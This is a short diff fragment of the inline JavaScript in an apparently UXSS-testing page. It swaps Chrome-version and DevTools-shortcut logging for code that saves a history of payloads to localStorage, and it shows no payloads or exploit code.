-    if(version) addLog(`Chrome version: ${version[1]} - UXSS patch status unknown`, "");
-}
-
-// Info additional
-document.addEventListener('keydown', (e) => {
-    if(e.ctrlKey && e.shiftKey && e.key === 'I') {
-        addLog("🔧 DevTools shortcut detected", "");
+// Simpan state
+window.addEventListener('beforeunload', () => {
+    if(payloadHistory.length > 0) {
+        localStorage.setItem('uxss_payloads', JSON.stringify(payloadHistory));
     }
 });
 </script>
